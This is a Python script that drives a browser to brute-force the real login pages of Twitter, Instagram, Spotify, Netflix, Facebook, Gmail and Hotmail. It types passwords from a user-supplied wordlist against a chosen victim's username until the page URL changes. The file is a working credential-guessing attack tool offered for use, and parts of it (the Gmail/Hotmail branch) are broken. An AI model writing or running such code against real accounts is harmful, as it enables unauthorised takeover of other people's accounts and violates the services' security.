from webbot import Browser
import time

def select_line(i, fname, opname):
	f = open(fname, "rb")
	k = 0
	while k < i :
		nb = 0
		while nb != b"\r":
			nb = f.read(1)
		k += 1
	location = f.tell()
	f.close()
	opname.seek(location)
	return opname.readline()

global urlcheck1
global urlcheck2
global checking
global username
global url
global password
print("")
print("\n      ---       ---           PPPPPP   RRRRRR    EEEEEEEE  SSSSSSS   EEEEEEEE  NNN     NN  TTTTTTTTTT  SSSSSSS\n    --- ---     ---           PP   PP  RR   RR   EE        SS   SSS  EE        NN NN   NN      TT      SS   SSS\n   ---   ---    ---           PPPPPP   RRRRRR    EEEEEEEE  SSS       EEEEEEEE  NN  NN  NN      TT      SSS\n  -----------   ---           PP       RRRR      EE           SSS    EE        NN   NN NN      TT         SSS\n ---       ---  ----------    PP       RR  RR    EE        SS   SS   EE        NN    NNNN      TT      SS   SS\n---         --- ----------    PP       RR   RRR  EEEEEEEE  SSSSSSS   EEEEEEEE  NN     NNN      TT      SSSSSSS\n \n")
starting = input(str(" -u                   --use ==========> Use to start program. \n -h                  --help ==========> Shows how to use.\n -v               --version ==========> Shows software version.  \n -e                  --exit ==========> Use to exit  \n\n Enter your option: \n ")).strip().lower()
strings = ["u", "-u", "h", "-h", "e", "-e", "v", "-v"]
while starting not in strings :
	print("\n______________________________________________________\n______________YOU MUST SELECT AN OPTION!______________\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n")
	starting = input(str(" -u                   --use ==========> Use to start program. \n -h                  --help ==========> Shows how to use.\n -v               --version ==========> Shows software version.  \n -e                  --exit ==========> Use to exit  \n\n Enter your option: \n ")).strip().lower()
if starting == "u" or starting == "-u":
	options = ["instagram", "twitter", "facebook", "spotify", "netflix", "gmail", "hotmail"]
	answer = input(str("Select a social media (Twitter, Facebook, Instagram):")).strip().lower()
	while answer not in options:
		print("\n______________________________________________________\n______________YOU MUST SELECT AN OPTION!______________\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n")
		answer = input(str("Select a social media (Twitter, Facebook, Instagram):")).strip().lower()
	pswd = input(str("Wordlist location and name:"))
	if answer == "twitter" or answer == "instagram" or answer == "spotify" or answer == "netflix":
		if answer == "twitter":
			username = input(str("Username (@????):"))
			url = "https://mobile.twitter.com/login?lang=en"
		elif answer == "netflix":
			username = input(str("E-mail or phone number:"))
			url = "https://www.netflix.com/login"
		elif answer == "instagram":
			username = input(str("Username:"))
			url = "https://www.instagram.com/accounts/login/?force_classic_login"
		elif answer == "spotify":
			username = input(str("E-mail or username:"))
			url = "https://accounts.spotify.com/login"		
		web = Browser()
		web.go_to(url)
		urlcheck1 = web.get_current_url()
		urlcheck2 = web.get_current_url()
		checking = urlcheck2.endswith("%2F")
		passwordopen = open(pswd,"rt")
		i = 0
		while urlcheck1 == urlcheck2 or checking == True:
			web.type(username, into= "username")
			password = (select_line(i, pswd, passwordopen)).replace("\n", "")
			if password == "":
				break
			print(password)
			web.type(password ,into= "password")
			if answer == "instagram":
				time.sleep(1)
			web.press(web.Key.ENTER)
			time.sleep(1)			
			urlcheck2 = web.get_current_url()
			checking = urlcheck2.endswith("%2F")
			i += 1
	elif answer == "facebook":
		username = input(str("Username:"))
		url = "https://m.facebook.com/login/?ref&fl"
		web = Browser()
		web.go_to(url)
		urlcheck1 =  web.get_current_url()
		web.type(username, into= 'username')
		urlcheck2 = web.get_current_url()
		passwordopen = open(pswd,"rt")
		i = 0
		while urlcheck1 == urlcheck2:
			password = passwordopen.readlines(i)
			web.type(password, id= 'm_login_password')
			web.press(web.Key.ENTER)
			time.sleep(10)
			urlcheck2 = web.get_current_url()
			i += 1
	elif answer == "gmail" or answer == "hotmail":
		if answer == "gmail":
			url = "https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
			username = input(str("E-mail:"))
		elif answer == "hotmail":
			url = "https://login.live.com"
			username = input(str("E-mail"))		
		web.go_to(url)
		web.type(username)
		web.press(web.Key.ENTER)
		time.sleep(1)
		urlcheck1 = web.get_current_url()
		passwordopen = open(password,"rt")
		i = 0
		while urlcheck1 == urlcheck2:
			password = passwordopen.readlines(i)
			urlcheck1 = web.get_current_url()
			web.type()
			web.press(web.Key.ENTER)
			urlcheck2 = web.get_current_url()
			i += 1
elif starting == "h" or starting == "-h":
	print("\n Hello\n")
elif starting == "v" or starting == "-v":
	print("\n Version 1.0\n")
elif starting == "e" or starting == "-e":
	raise SystemExit()